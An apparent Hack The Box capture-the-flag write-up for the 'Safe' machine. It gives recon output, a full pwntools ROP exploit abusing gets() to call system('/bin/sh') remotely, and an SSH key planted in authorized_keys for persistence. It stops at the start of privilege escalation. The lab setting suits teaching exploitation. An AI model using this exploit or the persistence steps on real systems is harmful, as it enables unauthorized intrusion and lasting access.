---
layout: default
title: "HTB Safe"
description: "10.10.10.147 | 20 pts"
header-img: ""
tags: []
---

# HTB Safe (10.10.10.147)

### TABLE OF CONTENTS

---

## PART 1 : INITIAL RECON

```console
$ nmap --min-rate 15000 -p- -v 10.10.10.147

  PORT     STATE SERVICE
  22/tcp   open  ssh
  80/tcp   open  http
  1337/tcp open  waste

$ nmap -p 22,80,1337 -sC -sV -T4 10.10.10.147

  PORT     STATE SERVICE VERSION
  22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
  | ssh-hostkey: 
  |   2048 6d:7c:81:3d:6a:3d:f9:5f:2e:1f:6a:97:e5:00:ba:de (RSA)
  |   256 99:7e:1e:22:76:72:da:3c:c9:61:7d:74:d7:80:33:d2 (ECDSA)
  |_  256 6a:6b:c3:8e:4b:28:f7:60:85:b1:62:ff:54:bc:d8:d6 (ED25519)
  80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
  |_http-server-header: Apache/2.4.25 (Debian)
  |_http-title: Apache2 Debian Default Page: It works
  1337/tcp open  waste?
  | fingerprint-strings: 
  |   DNSStatusRequestTCP: 
  |     09:11:19 up 19:31, 0 users, load average: 0.00, 0.03, 0.00
  |   DNSVersionBindReqTCP: 
  |     09:11:13 up 19:31, 0 users, load average: 0.00, 0.03, 0.00
  |   GenericLines: 
  |     09:10:59 up 19:31, 0 users, load average: 0.01, 0.03, 0.00
  |     What do you want me to echo back?
  |   GetRequest: 
  |     09:11:05 up 19:31, 0 users, load average: 0.01, 0.03, 0.00
  |     What do you want me to echo back? GET / HTTP/1.0
  |   HTTPOptions: 
  |     09:11:06 up 19:31, 0 users, load average: 0.01, 0.03, 0.00
  |     What do you want me to echo back? OPTIONS / HTTP/1.0
  |   Help: 
  |     09:11:24 up 19:31, 0 users, load average: 0.00, 0.03, 0.00
  |     What do you want me to echo back? HELP
  |   NULL: 
  |     09:10:59 up 19:31, 0 users, load average: 0.01, 0.03, 0.00
  |   RPCCheck: 
  |     09:11:08 up 19:31, 0 users, load average: 0.00, 0.03, 0.00
  |   RTSPRequest: 
  |     09:11:07 up 19:31, 0 users, load average: 0.00, 0.03, 0.00
  |     What do you want me to echo back? OPTIONS / RTSP/1.0
  |   SSLSessionReq: 
  |     09:11:25 up 19:31, 0 users, load average: 0.00, 0.03, 0.00
  |     What do you want me to echo back?
  |   TLSSessionReq: 
  |     09:11:27 up 19:31, 0 users, load average: 0.00, 0.03, 0.00
  |     What do you want me to echo back?
  |   TerminalServerCookie: 
  |     09:11:26 up 19:31, 0 users, load average: 0.00, 0.03, 0.00
  |_    What do you want me to echo back?

```

---

## PART 2 : PORT ENUMERATION

### TCP PORT 80

Opening __`http://10.10.10.147`__ brings you to a default web server page:

![80 Landing Page](./screenshots/33_safe/80_landing_page.png)

And viewing its page source reveals an HTML comment:

```html
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<!-- 'myapp' can be downloaded to analyze from here
     its running on port 1337 -->
...omitted...
</html>
```

It says that an application, [myapp](), is running on port 1337 and could be downloaded via HTTP.

```console
$ wget http://10.10.10.147/myapp

  Connecting to 10.10.10.147:80... connected.
  HTTP request sent, awaiting response... 200 OK
  Length: 16592 (16K)
  Saving to: ‘myapp’

  myapp                     100%[=====================================>]  16.20K

```

### TCP PORT 1337

The downloaded application was said to be hosted on this port and trying to access it over <span>netcat</span> goes like the following:

```console
$ nc 10.10.10.147 1337

   09:30:08 up 19:50,  0 users,  load average: 0.02, 0.01, 0.00
  test_input_string

  What do you want me to echo back? test_input_string

```

The same goes when trying to execute the downloaded application from earlier.

```console
$ chmod +x myapp

$ ./myapp

   21:32:30 up 59 min,  1 user,  load average: 3.47, 3.49, 3.48

  What do you want me to echo back? test_input_string_for_myapp_local
  test_input_string_for_myapp_local

```

With a local copy of the binary, it should be easier to create an exploit to achieve remote command execution.

---

## PART 3 : EXPLOITATION

### ./myapp

```console
$ file ./myapp

  ./myapp: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, 
  interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=fcbd5
  450d23673e92c8b716200762ca7d282c73a, not stripped

$ gdb -q ./myapp

(gdb) checksec

  Canary                        : No
  NX                            : Yes
  PIE                           : No
  Fortify                       : No
  RelRO                         : Partial

```

__`./myapp`__ is a <strong style="color:orange">64-bit ELF executable</strong> which means that crafting ROP chains with function arguments requries setting certain register values before passing each function call. Its security features include only __*NX (non-executable segment)*__ enabled and __*Partial RelRO (Relocation Read-Only)*__.

<strong style="color:orange">NX (Non-execute)</strong>
> The application, when loaded in memory, does not allow any of its segments to be both writable and executable. The idea here is that writable memory should never be executed (as it can be manipulated) and vice versa.

<strong style="color:orange">Partial RelRO (Relocation Read-Only)</strong>
> The headers in your binary, which need to be writable during startup of the application (to allow the dynamic linker to load and link stuff like shared libraries) are marked as read-only when the linker is done doing its magic (but before the application itself is launched).

### the __main()__ function

```sh
(gdb) disassemble main

  0x000000000040115f <+0>:	push   rbp
  0x0000000000401160 <+1>:	mov    rbp,rsp
  0x0000000000401163 <+4>:	sub    rsp,0x70
  0x0000000000401167 <+8>:	lea    rdi,[rip+0xe9a]        # 0x402008
  0x000000000040116e <+15>:	call   0x401040 <system@plt>
  0x0000000000401173 <+20>:	lea    rdi,[rip+0xe9e]        # 0x402018
  0x000000000040117a <+27>:	mov    eax,0x0
  0x000000000040117f <+32>:	call   0x401050 <printf@plt>
  0x0000000000401184 <+37>:	lea    rax,[rbp-0x70]
  0x0000000000401188 <+41>:	mov    esi,0x3e8
  0x000000000040118d <+46>:	mov    rdi,rax
  0x0000000000401190 <+49>:	mov    eax,0x0
  0x0000000000401195 <+54>:	call   0x401060 <gets@plt>
  0x000000000040119a <+59>:	lea    rax,[rbp-0x70]
  0x000000000040119e <+63>:	mov    rdi,rax
  0x00000000004011a1 <+66>:	call   0x401030 <puts@plt>
  0x00000000004011a6 <+71>:	mov    eax,0x0
  0x00000000004011ab <+76>:	leave  
  0x00000000004011ac <+77>:	ret  
 
```

Since there is already a call to the <strong style="color:orange">libc system function</strong> (__`system@plt`__) and a way to write to memory using the existing call to __`gets()`__ (__`gets@plt`__), there is no need to leak libc addresses to compute offsets beacuse we already have what we need aside from having control of the <strong style="color:orange">$rdi</strong> register.

In creating 64-bit ROP chains, the value of the <strong style="color:orange">$rdi</strong> register can be used to pass a first argument to a function (followed by <strong style="color:orange">$rsi</strong>, <strong style="color:orange">$rdx</strong>, <strong style="color:orange">$rcx</strong>, <strong style="color:orange">$r8</strong>, then <strong style="color:orange">$r9</strong>). To summarize the code snippet (__`<+37>`__ to __`<+54>`__) above, the address __`[rbp-0x70]`__ is saved to __`$rax`__ which is then moved to __`$rdi`__. __`[rbp-0x70]`__ is now the effective address where the function call __`gets@plt`__ will save the input from STDIN.

### exploit.py (finding the right offset)

```py
payload = ""
payload += "A" * int("0x70", 16)	# OFFSET
payload += "B" * 8			# BASE POINTER
payload += "C" * 8                      # RETURN ADDRESS PLACEHOLDER
```
```sh
(gdb) break * 0x00000000004011ac  # main() function's return call

  Breakpoint 1 at 0x4011ac

(gdb) run <<< $(python -c 'print "A"*int("0x70",16) + "B"*8 + "C"*8')

(gdb) x/i $rip

  => 0x4011ac <main+77>:	ret

(gdb) x/xw $rsp

  0x7fffffffe088:  0x4343434343434343

```

The user input for gets is saved at __`[rbp-0x70]`__. Since the return address is, in this case, 8 bytes away from the base pointer, writing 8 bytes beyond __`[rbp-0x80]`__ would overwrite the value of __`$rbp`__ and another 8 bytes would overwrite the return address.

At the current instruction, __`ret`__, the return address referenced by the stack pointer is now overwritten to be __`4343434343434343`__ or __`CCCCCCCC`__.

### exploit.py (writing "/bin/sh" to memory)

```console
$ ROPgadget --binary ./myapp | grep "pop rdi"

  0x000000000040120b : pop rdi ; ret

```
```sh
(gdb) info files

  ...omitted...
  0x0000000000404048 - 0x0000000000404050 is .bss
  ...omitted...

(gdb) x/2xg 0x0000000000404048

  0x404048 <completed.7325>:	0x0000000000000000	0x0000000000000000

```
```py
from pwn import *

pwnable = process("./myapp")

payload = ""
payload += "A" * int("0x70", 16)	# OFFSET
payload += "B" * 8			# BASE POINTER
payload += p64(0x40120b)                # pop rdi; ret;
payload += p64(0x404048)                # $rdi (.bss segment) 
payload += p64(0x401060)                # ret (gets@plt)
payload += p64(0x40115f)                # main <+0>

pwnable.sendline(payload)

shell = "/bin/sh"
pwnable.sendline(shell + "\x00"*(8-(len(shell)%8)))
```

The string __`/bin/sh\x00`__ is written to the <strong style="color:orange">.bss section</strong> since the payload constructed above simulates __`gets(.bss)`__ then returns back to __`main()`__ in order to make use of the written value. It is essential to return to __`main()`__ since, otherwise, once the program terminates, the stored "/bin/sh" string will no longer be accessible.

<strong style="color:orange">.bss section</strong> ([according to Wikipedia](https://en.wikipedia.org/wiki/.bss))
> It used by many compilers and linkers for the portion of an object file or executable containing statically-allocated variables that are not explicitly initialized to any value. It is often referred to as the "bss section" or "bss segment".
>
> Typically only the length of the bss section, but no data, is stored in the object file. The program loader allocates memory for the bss section when it loads the program. On some platforms, some or all of the bss section is initialized to zeroes. Unix-like systems and Windows initialize the bss section to zero, allowing C and C++ statically-allocated variables initialized to values represented with all bits zero to be put in the bss segment. Operating systems may use a technique called zero-fill-on-demand to efficiently implement the bss segment.

### exploit.py (call system@plt)

```py
payload = ""
payload += "A" * int("0x70", 16)	# OFFSET
payload += "B" * 8			# BASE POINTER
payload += p64(0x40120b)                # pop rdi; ret;
payload += p64(0x404048)                # $rdi (.bss segment) 
payload += p64(0x401060)                # ret (system@plt)
```

After returning back to the __`main()`__ function, create a payload that recreates the function call, __`system("/bin/sh")`__.

### exploit.py (putting everything together)

```py
from pwn import *

pwnable = remote("10.10.10.147", 1337)

pwnable.recvline()

payload = ""
payload += "A" * int("0x70", 16)	# OFFSET
payload += "B" * 8			# BASE POINTER
payload += p64(0x40120b)                # pop rdi; ret;
payload += p64(0x404048)                # rdi | .bss segment 
payload += p64(0x401060)                # ret | gets@plt
payload += p64(0x40115f)                # main <+0>

pwnable.sendline(payload)

shell = "/bin/sh"
pwnable.sendline(shell + "\x00"*(8-(len(shell)%8)))

pwnable.recvline()

payload = ""
payload += "A" * int("0x70", 16)	# OFFSET
payload += "B" * 8			# BASE POINTER
payload += p64(0x40120b)                # pop rdi; ret;
payload += p64(0x404048)                # rdi | .bss segment
payload += p64(0x401040)                # ret | system@plt

pwnable.sendline(payload)
pwnable.interactive()
```

### exploit.py (running the exploit)

```console
$ python exploit.py

  [+] Opening connection to 10.10.10.147 on port 1337: Done
  [*] Switching to interactive mode

$ id

  uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(bluetooth)

$ cat /etc/passwd | egrep -e "*sh$"

  root:x:0:0:root:/root:/bin/bash
  user:x:1000:1000:user,,,:/home/user:/bin/bash

$ cat /home/user/user.txt

  7a29........................7690

```

---

## PART 4 : GENERATE USER SHELL (user)

While inside the __`exploit.py`__ shell, upload an __ssh public key__:

```console
$ mkdir .ssh

$ echo -e "\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7q7Tojx6CL6s/GpGhI83xOzVnio8uQEkB28KhQdAf2q/yMofCRisKXJ9Y9gvk2i+GyMn8KJLqGLhu/xLf8g8WXMNfGD7gKwL7SYGOE9pTSWzZq/4EKllE51+Z6GNn/5rp5YJtPKhdkE1C3vp0IBMMw6W6CXqnnbDTKIIe8UY93vwdhvbKKH4mo9Hv1TkbzWbnGGYYyr31wuH1ZW9QUqNjiSWkateNGj+UURgt3YvtdPQmcdNudjiKxQlxaXrkyaZDMZIA9CCxIXUBn/n0/ARD2rjdUDxPFeKheKJcszk6rFNb+4hr5DHFpPPuLG0MGp5qzbnSQbwpveNIk29ECeCxyVy3S8fcZLICTz73NFoXB5zNHjaQlIAk82YGn0F5nmH/rSvcYrFcM55NFL8Fp4qW6piDRhTatVV6/7CJzbcZ5w54dn1iloOc18cyu04COe8456FdXQRqayGuLR1IoFXR/t47pLHai3gFkLESP1PFebnjJGCvz4r7Bl8t3TnLG4k= root@kali" >> /home/user/.ssh/authorized_keys
```

Once this is done, connect via __`ssh`__ as user, __`user`__:

```console
$ ssh -i id_rsa -l user 10.10.10.147

user@safe:~$
```

---

## PART 5 : PRIVILEGE ESCALATION (user -> root)

```console
user@safe:~$ ls -lh

  -rw-r--r-- 1 user user 1907614 May 13 11:15 IMG_0545.JPG
  -rw-r--r-- 1 user user 1916770 May 13 11:15 IMG_0546.JPG
  -rw-r--r-- 1 user user 2529361 May 13 11:15 IMG_0547.JPG
  -rw-r--r-- 1 user user 2926644 May 13 11:15 IMG_0548.JPG
  -rw-r--r-- 1 user user 1125421 May 13 11:15 IMG_0552.JPG
  -rw-r--r-- 1 user user 1085878 May 13 11:15 IMG_0553.JPG
  -rwxr-xr-x 1 user user   16592 May 13 08:47 myapp
  -rw-r--r-- 1 user user    2446 May 13 11:15 MyPasswords.kdbx

```

